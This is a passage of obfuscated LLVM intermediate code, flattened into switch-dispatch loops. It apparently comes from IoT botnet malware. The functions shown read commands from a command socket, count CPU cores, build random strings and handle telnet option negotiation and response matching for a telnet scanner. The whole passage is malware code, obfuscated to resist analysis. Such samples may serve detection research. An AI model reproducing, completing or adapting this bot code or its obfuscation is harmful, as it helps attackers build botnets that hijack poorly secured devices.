  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  store i32 145972150, i32* %switchVar
  store i1 %65, i1* %.reg2mem2
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %67 = select i1 %.reload3, i32 -790864214, i32 465190630
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  store i32 1080572751, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %6, align 8
  %76 = call i8* @strchr(i8* %75, i32 46) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 2113727100, i32 553900623
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %6, align 8
  %81 = call i8* @strchr(i8* %80, i32 46) #10
  store i8 0, i8* %81, align 1
  store i32 553900623, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %3, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i8* @strcpy(i8* %83, i8* %84) #5
  %86 = load i32, i32* %4, align 4
  %87 = call i32 @close(i32 %86)
  store i32 0, i32* %2, align 4
  store i32 1058394647, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %89, i8 0, i64 4096, i32 16, i1 false)
  store i32 -113099638, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  store i32 1, i32* %2, align 4
  store i32 1058394647, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %2, align 4
  ret i32 %94

loopEnd:                                          ; preds = %90, %88, %82, %79, %74, %68, %66, %57, %47, %46, %43, %41, %36, %30, %24, %21, %14, %8, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.38, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  %switchVar = alloca i32
  store i32 -1656837826, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1656837826, label %5
    i32 1634778789, label %11
    i32 -76824865, label %18
    i32 247613003, label %21
    i32 -1207281355, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  %10 = select i1 %9, i32 1634778789, i32 -1207281355
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %12)
  %13 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0)) #10
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %16 = icmp eq i8* %14, %15
  %17 = select i1 %16, i32 -76824865, i32 247613003
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  store i32 247613003, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  store i32 -1656837826, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %21, %18, %11, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1984896185, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1984896185, label %6
    i32 -1936706398, label %11
    i32 1674687678, label %20
    i32 458161273, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -1936706398, i32 458161273
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 1674687678, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 1984896185, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 825008388, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 825008388, label %24
    i32 -1894243695, label %33
    i32 -13703305, label %50
    i32 1327701521, label %51
    i32 913866699, label %55
    i32 -1478896091, label %60
    i32 880037607, label %69
    i32 -1927765111, label %86
    i32 -1019888258, label %89
    i32 331875588, label %90
    i32 1209047028, label %91
    i32 352622554, label %93
    i32 717946257, label %98
    i32 554863613, label %103
    i32 1312876652, label %105
    i32 -1284782875, label %113
    i32 754535185, label %114
    i32 -1666682653, label %117
    i32 -1603404031, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 -1894243695, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -13703305, i32 1209047028
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 1327701521, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 913866699, i32 331875588
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 -1478896091, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #5, !srcloc !2
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 880037607, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 -1927765111, i32 -1019888258
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 1327701521, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 331875588, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 1209047028, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 352622554, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 717946257, i32 -1666682653
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 554863613, i32 1312876652
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 -1603404031, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 -1284782875, i32 754535185
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 -1666682653, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 352622554, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 -1603404031, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #4

declare i64 @recv(i32, i8*, i64, i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1257910872, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1257910872, label %first
    i32 -301290594, label %28
    i32 404762088, label %32
    i32 1450000530, label %38
    i32 -1116576121, label %39
    i32 1691241266, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 -301290594, i32 404762088
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 404762088, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1450000530, i32 -1116576121
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 1691241266, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 1691241266, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 -928074945, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -928074945, label %18
    i32 2036346780, label %27
    i32 -356437579, label %44
    i32 788232888, label %45
    i32 384427240, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 2036346780, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 -356437579, i32 788232888
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 384427240, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 384427240, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -874829049, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -874829049, label %NodeBlock
    i32 -1165541868, label %LeafBlock1
    i32 -1474057814, label %LeafBlock
    i32 -283606751, label %16
    i32 1574478216, label %17
    i32 1532930866, label %26
    i32 -55218205, label %27
    i32 361124376, label %34
    i32 2060337148, label %35
    i32 -1353744692, label %42
    i32 -1999704919, label %50
    i32 1896344707, label %58
    i32 1524517876, label %59
    i32 2076452351, label %60
    i32 -322658828, label %NewDefault
    i32 2063675847, label %67
    i32 -2110851474, label %68
    i32 137716295, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -1474057814, i32 -1165541868
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -283606751, i32 -322658828
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 1574478216, i32 -322658828
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 137716295, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 1532930866, i32 -55218205
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 2076452351, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 361124376, i32 2060337148
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 1524517876, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 -1353744692, i32 -1999704919
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 1896344707, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 1896344707, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 1524517876, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 2076452351, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -2110851474, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 2063675847, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -2110851474, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 137716295, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
